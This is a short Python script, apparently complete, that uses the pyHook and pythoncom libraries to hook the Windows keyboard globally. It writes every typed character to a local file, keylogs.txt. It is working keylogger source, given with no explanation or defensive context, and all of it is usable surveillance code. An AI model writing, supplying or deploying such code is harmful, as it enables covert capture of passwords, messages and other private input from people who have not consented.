import pyHook
import pythoncom

def OnKeyboardEvent(event):
    if event.Ascii:
        with open('keylogs.txt', 'a') as f:
            f.write(chr(event.Ascii))
    return True

hook_manager = pyHook.HookManager()
hook_manager.KeyDown = OnKeyboardEvent
hook_manager.HookKeyboard()
pythoncom.PumpMessages()